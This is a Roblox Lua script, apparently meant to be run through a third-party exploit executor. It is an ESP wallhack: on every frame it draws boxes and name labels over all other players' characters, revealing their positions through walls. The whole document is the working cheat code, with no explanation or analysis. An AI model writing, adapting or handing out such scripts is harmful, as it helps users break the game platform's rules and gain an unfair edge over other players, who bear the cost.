local camera = game:GetService("Workspace").CurrentCamera
local CurrentCamera =workspace.CurrentCamera
local pp = game.Players.LocalPlayer
local worldToViewportPoint = CurrentCamera.worldToViewportPoint
local bhead = Vector3.new(0,0.5,0)
local bleg = Vector3.new(0,3,0)


for _,v in pairs(game.Players:GetChildren()) do
	local BoxOutline = Drawing.new("Square")
	BoxOutline.Visible = false

	BoxOutline.Color = Color3.new(0,0,0)


	BoxOutline.Thickness = 3
	BoxOutline.Transparency = 1
	BoxOutline.Filled = false

	local mbox = Drawing.new("Square")
	mbox.Visible = false



	mbox.Color = Color3.fromRGB(107,50,124)


	mbox.Thickness = 1
	mbox.Transparency = 1
	mbox.Filled = false

	local names = Drawing.new("Text")
	names.Text = v.Name
	names.Color = Color3.fromRGB(123,0,123)
	names.Font = 3
	names.Visible = false

	function esp()
		game:GetService("RunService").RenderStepped:connect(function()
			if v.Character ~= nil and v.Character:FindFirstChild("Humanoid") ~= nil and v.Character:FindFirstChild("HumanoidRootPart") ~= nil and v ~= pp and v.Character.Humanoid.Health > 0 then
				local Vector, onScreen = camera:worldToViewportPoint(v.Character.HumanoidRootPart.Position)
				local rootpart = v.Character.HumanoidRootPart
				local Head = v.Character.Head
				local rootpos, rootvis = worldToViewportPoint(CurrentCamera,rootpart.Position)
				local headpos = worldToViewportPoint(CurrentCamera, Head.Position + bhead)
				local legpos = worldToViewportPoint(CurrentCamera, rootpart.Position - bleg)
				if onScreen then
					BoxOutline.Size = Vector2.new(1000 / rootpos.Z, headpos.Y - legpos.Y)
					BoxOutline.Position = Vector2.new(rootpos.X - BoxOutline.Size.X /2, rootpos.Y - BoxOutline.Size.Y / 2)
					BoxOutline.Visible = true

					mbox.Size = Vector2.new(1000 / rootpos.Z, headpos.Y - legpos.Y)
					mbox.Position = Vector2.new(rootpos.X - mbox.Size.X /2, rootpos.Y - mbox.Size.Y / 2)
					mbox.Visible = true


					names.Position = Vector2.new(headpos.X,headpos.Y)
					names.Visible = true   

				else
					BoxOutline.Visible = false
					mbox.Visible = false
					names.Visible = false

				end
			else
				BoxOutline.Visible = false
				mbox.Visible = false
				names.Visible = false

			end
		end)
	end
	coroutine.wrap(esp)()
end

